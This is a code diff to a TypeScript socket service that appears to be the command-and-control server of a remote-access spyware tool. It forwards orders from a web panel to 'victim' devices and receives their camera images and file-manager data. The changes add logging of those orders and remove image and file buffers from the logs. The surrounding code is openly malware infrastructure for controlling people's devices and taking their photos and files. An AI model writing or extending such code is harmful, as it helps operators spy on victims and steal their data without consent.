@@ -89,6 +89,16 @@ export class SocketService {
         socket: Socket<IServerToVictimEvents, IServerToVictimEvents>,
     ): Promise<void> {
         socket.on(ServerToVictimEvents.VICTIM_ORDER, (payload) => {
+            logger.verbose(
+                `Received order from web for device ${victim.deviceId}`,
+                {
+                    label: 'socket',
+                    action: 'order',
+                    deviceId: victim.deviceId,
+                    payload,
+                },
+            );
+
             this.io
                 .to(victim.deviceId)
                 .emit(ServerToVictimEvents.VICTIM_ORDER, payload);
@@ -157,11 +167,12 @@ export class SocketService {
         });
 
         socket.on(VictimOrder.CAMERA, (data) => {
+            const { buffer, ...filteredData } = data;
             logger.info("Received data for camera order from victim's device", {
                 label: 'socket',
                 action: 'order',
                 deviceId,
-                data,
+                data: filteredData,
             });
 
             this.deviceNS.to(deviceId).emit(VictimOrder.CAMERA, data);
@@ -182,13 +193,22 @@ export class SocketService {
         });
 
         socket.on(VictimOrder.FILE_MANAGER, (data) => {
+            let filteredData: unknown;
+
+            if (Array.isArray(data)) {
+                filteredData = data;
+            } else if (data.file) {
+                const { buffer, ...rest } = data;
+                filteredData = rest;
+            }
+
             logger.info(
                 "Received data for file manager order from victim's device",
                 {
                     label: 'socket',
                     action: 'order',
                     deviceId,
-                    data,
+                    data: filteredData,
                 },
             );
 
